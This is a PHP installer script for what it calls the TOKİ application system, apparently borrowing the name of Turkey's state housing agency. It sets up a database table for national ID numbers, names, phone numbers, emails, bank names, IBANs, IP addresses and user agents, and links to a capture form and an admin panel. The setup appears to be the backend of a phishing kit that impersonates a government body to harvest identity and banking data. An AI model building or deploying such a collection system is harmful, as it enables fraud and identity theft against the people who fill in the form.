<?php

/**

 * TOKİ Başvuru Sistemi - Otomatik Kurulum

 * Bu dosyayı tarayıcıda bir kez çalıştırın: http://localhost/tokip/install_basvuru.php

 */

 

// Veritabanı bağlantısı

require_once 'inc/brain.php';

 

echo "<!DOCTYPE html>

<html lang='tr'>

<head>

    <meta charset='UTF-8'>

    <title>TOKİ Başvuru Sistemi Kurulum</title>

    <style>

        body {

            font-family: Arial, sans-serif;

            max-width: 800px;

            margin: 50px auto;

            padding: 20px;

            background: #f5f5f5;

        }

        .container {

            background: white;

            padding: 30px;

            border-radius: 10px;

            box-shadow: 0 2px 10px rgba(0,0,0,0.1);

        }

        .success {

            color: #28a745;

            padding: 15px;

            background: #d4edda;

            border: 1px solid #c3e6cb;

            border-radius: 5px;

            margin: 10px 0;

        }

        .error {

            color: #dc3545;

            padding: 15px;

            background: #f8d7da;

            border: 1px solid #f5c6cb;

            border-radius: 5px;

            margin: 10px 0;

        }

        .info {

            color: #004085;

            padding: 15px;

            background: #cce5ff;

            border: 1px solid #b8daff;

            border-radius: 5px;

            margin: 10px 0;

        }

        h1 {

            color: #333;

            border-bottom: 3px solid #007bff;

            padding-bottom: 10px;

        }

        .btn {

            display: inline-block;

            padding: 10px 20px;

            background: #007bff;

            color: white;

            text-decoration: none;

            border-radius: 5px;

            margin-top: 20px;

        }

        .btn:hover {

            background: #0056b3;

        }

        code {

            background: #f4f4f4;

            padding: 2px 5px;

            border-radius: 3px;

            font-family: monospace;

        }

        ul {

            line-height: 1.8;

        }

    </style>

</head>

<body>

    <div class='container'>

        <h1>🏗️ TOKİ Başvuru Sistemi Kurulum</h1>";

 

try {

    // Tablo var mı kontrol et

    $checkTable = $pdo->query("SHOW TABLES LIKE 'basvuru_bilgileri'");

 

    if ($checkTable->rowCount() > 0) {

        echo "<div class='info'>

                <strong>ℹ️ Bilgi:</strong> <code>basvuru_bilgileri</code> tablosu zaten mevcut!

              </div>";

 

        // Kayıt sayısını göster

        $countStmt = $pdo->query("SELECT COUNT(*) as total FROM basvuru_bilgileri");

        $count = $countStmt->fetch();

 

        echo "<div class='success'>

                <strong>✅ Başarılı!</strong> Sistem hazır ve çalışıyor.<br>

                Şu anda <strong>{$count['total']}</strong> adet başvuru kaydı var.

              </div>";

    } else {

        // Tabloyu oluştur

        $sql = "CREATE TABLE IF NOT EXISTS `basvuru_bilgileri` (

          `id` int(11) NOT NULL AUTO_INCREMENT,

          `log_time` datetime NOT NULL DEFAULT current_timestamp(),

          `tckn` varchar(11) NOT NULL,

          `adsoyad` varchar(100) NOT NULL,

          `cep_telefonu` varchar(20) NOT NULL,

          `email` varchar(255) NOT NULL,

          `banka_adi` varchar(100) DEFAULT NULL,

          `iban` varchar(50) DEFAULT NULL,

          `calisiyor_mu` tinyint(1) DEFAULT NULL,

          `proje_adi` varchar(255) DEFAULT NULL,

          `ip_address` varchar(45) DEFAULT NULL,

          `user_agent` text DEFAULT NULL,

          `durum` varchar(50) DEFAULT 'Beklemede',

          PRIMARY KEY (`id`),

          KEY `idx_tckn` (`tckn`),

          KEY `idx_log_time` (`log_time`)

        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci";

 

        $pdo->exec($sql);

 

        echo "<div class='success'>

                <strong>✅ Tebrikler!</strong> <code>basvuru_bilgileri</code> tablosu başarıyla oluşturuldu!

              </div>";

    }

 

    echo "<h2>📋 Kurulum Detayları</h2>

          <ul>

            <li><strong>Veritabanı:</strong> " . $pdo->query('SELECT DATABASE()')->fetchColumn() . "</li>

            <li><strong>Tablo Adı:</strong> <code>basvuru_bilgileri</code></li>

            <li><strong>Karakter Seti:</strong> utf8mb4</li>

            <li><strong>Durum:</strong> <span style='color:green;'>✅ Hazır</span></li>

          </ul>";

 

    echo "<h2>🎯 Sonraki Adımlar</h2>

          <ul>

            <li>✅ 1binfo.php formu artık veritabanına kayıt yapıyor</li>

            <li>✅ Admin panelinden başvuruları görüntüleyebilirsiniz</li>

            <li>🔗 <a href='admin/francis-basvuru.php' target='_blank'>Admin Paneli - Başvurular</a></li>

            <li>🔗 <a href='1binfo.php' target='_blank'>Test Formu (1binfo.php)</a></li>

          </ul>";

 

    echo "<div class='info'>

            <strong>🔒 GÜVENLİK UYARISI:</strong><br>

            Kurulum tamamlandıktan sonra bu dosyayı <code>install_basvuru.php</code> silin veya yeniden adlandırın!

          </div>";

 

    echo "<h2>📊 Tablo Yapısı</h2>

          <table style='width:100%; border-collapse: collapse; margin-top:10px;'>

            <thead>

                <tr style='background:#007bff; color:white;'>

                    <th style='padding:10px; text-align:left; border:1px solid #ddd;'>Alan</th>

                    <th style='padding:10px; text-align:left; border:1px solid #ddd;'>Tip</th>

                    <th style='padding:10px; text-align:left; border:1px solid #ddd;'>Açıklama</th>

                </tr>

            </thead>

            <tbody>

                <tr><td style='padding:8px; border:1px solid #ddd;'>id</td><td style='padding:8px; border:1px solid #ddd;'>int(11)</td><td style='padding:8px; border:1px solid #ddd;'>Otomatik artan ID</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>log_time</td><td style='padding:8px; border:1px solid #ddd;'>datetime</td><td style='padding:8px; border:1px solid #ddd;'>Kayıt zamanı</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>tckn</td><td style='padding:8px; border:1px solid #ddd;'>varchar(11)</td><td style='padding:8px; border:1px solid #ddd;'>TC Kimlik No</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>adsoyad</td><td style='padding:8px; border:1px solid #ddd;'>varchar(100)</td><td style='padding:8px; border:1px solid #ddd;'>Ad Soyad</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>cep_telefonu</td><td style='padding:8px; border:1px solid #ddd;'>varchar(20)</td><td style='padding:8px; border:1px solid #ddd;'>Cep telefonu</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>email</td><td style='padding:8px; border:1px solid #ddd;'>varchar(255)</td><td style='padding:8px; border:1px solid #ddd;'>E-posta</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>banka_adi</td><td style='padding:8px; border:1px solid #ddd;'>varchar(100)</td><td style='padding:8px; border:1px solid #ddd;'>Banka adı</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>iban</td><td style='padding:8px; border:1px solid #ddd;'>varchar(50)</td><td style='padding:8px; border:1px solid #ddd;'>IBAN numarası</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>calisiyor_mu</td><td style='padding:8px; border:1px solid #ddd;'>tinyint(1)</td><td style='padding:8px; border:1px solid #ddd;'>Çalışma durumu (0/1)</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>proje_adi</td><td style='padding:8px; border:1px solid #ddd;'>varchar(255)</td><td style='padding:8px; border:1px solid #ddd;'>Proje adı</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>ip_address</td><td style='padding:8px; border:1px solid #ddd;'>varchar(45)</td><td style='padding:8px; border:1px solid #ddd;'>IP adresi</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>user_agent</td><td style='padding:8px; border:1px solid #ddd;'>text</td><td style='padding:8px; border:1px solid #ddd;'>Tarayıcı bilgisi</td></tr>

                <tr><td style='padding:8px; border:1px solid #ddd;'>durum</td><td style='padding:8px; border:1px solid #ddd;'>varchar(50)</td><td style='padding:8px; border:1px solid #ddd;'>Durum (Beklemede/Onaylandı/Reddedildi)</td></tr>

            </tbody>

          </table>";

 

} catch (PDOException $e) {

    echo "<div class='error'>

            <strong>❌ Hata:</strong> " . htmlspecialchars($e->getMessage()) . "

          </div>";

 

    echo "<h3>🔧 Olası Çözümler:</h3>

          <ul>

            <li>XAMPP'ta MySQL servisinin çalıştığından emin olun</li>

            <li><code>inc/brain.php</code> dosyasındaki veritabanı bilgilerini kontrol edin</li>

            <li>Veritabanı adının <code>yenibir</code> olduğundan emin olun</li>

            <li>MySQL kullanıcısının tablo oluşturma yetkisi olduğunu kontrol edin</li>

          </ul>";

}

 

echo "    </div>

    </body>

    </html>";

?>